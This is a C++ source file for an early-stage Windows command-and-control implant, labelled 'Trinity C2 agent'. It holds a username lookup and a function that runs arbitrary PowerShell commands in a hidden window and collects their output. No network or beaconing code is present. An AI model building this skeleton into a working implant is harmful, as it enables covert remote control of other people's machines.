//  ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^ { START OF FILE } ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^ //
#include "Agent.h"

void Agent::Exit()
{
    // Exit agent process
    ExitProcess(0);
}

std::string Agent::GetUID()
{
    char username[256];
    DWORD username_len = sizeof(username);
    // Get the username of the current user
    if (GetUserNameA(username, &username_len))
    {
        return std::string(username);
    }

    return std::string();
}

std::string Agent::ExecuteCommand(int commandType)
{
    switch (commandType)
    {
    case 0x0017:
        return GetUID();
    default:
        return std::string();
    }
}

std::string Agent::ExecutePowerShell(const std::string &command)
{
#ifdef _WIN32
    // Execute PowerShell command and return the output
    std::string result;
    SECURITY_ATTRIBUTES sa;
    sa.nLength = sizeof(sa);
    sa.bInheritHandle = TRUE;

    HANDLE hRead = nullptr;
    HANDLE hWrite = nullptr;

    if (!CreatePipe(&hRead, &hWrite, &sa, 0))
    {
        return "Failed to create pipe.";
    }

    SetHandleInformation(hRead, HANDLE_FLAG_INHERIT, 0);

    std::string psCommand = "powershell.exe -NoProfile -NonInteractive -Command \"" + command + "\"";

    STARTUPINFOA si{};
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESTDHANDLES;
    si.hStdOutput = hWrite;
    si.hStdError = hWrite;

    PROCESS_INFORMATION pi{};

    BOOL success = CreateProcessA(
        nullptr,
        psCommand.data(),
        nullptr,
        nullptr,
        TRUE,
        CREATE_NO_WINDOW,
        nullptr,
        nullptr,
        &si,
        &pi);

    if (!success)
    {
        CloseHandle(hWrite);
        return "Failed to create process.";
    }

    CloseHandle(hWrite);

    char buffer[4096];
    DWORD bytesRead = 0;

    while (ReadFile(
               hRead,
               buffer,
               sizeof(buffer),
               &bytesRead,
               nullptr) &&
           bytesRead > 0)
    {
        result.append(buffer, bytesRead);
    }

    WaitForSingleObject(pi.hProcess, INFINITE);

    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    CloseHandle(hRead);

    return result;
#else
    (void)command; // Suppress unused parameter warning
    return "PowerShell execution is only supported on Windows.";
#endif
}

void Agent::Init()
{
    // Initialize agent
    user = GetUID();
}

std::string Agent::GetUser() const
{
    return user;
}

int main(int argc, char *argv[])
{
    MessageBoxA(NULL, "Trinity C2 agent", ";)", MB_OK);

    Agent agent;
    agent.Init();

    return 0;
}

//  ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^ { END OF FILE } ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^ //
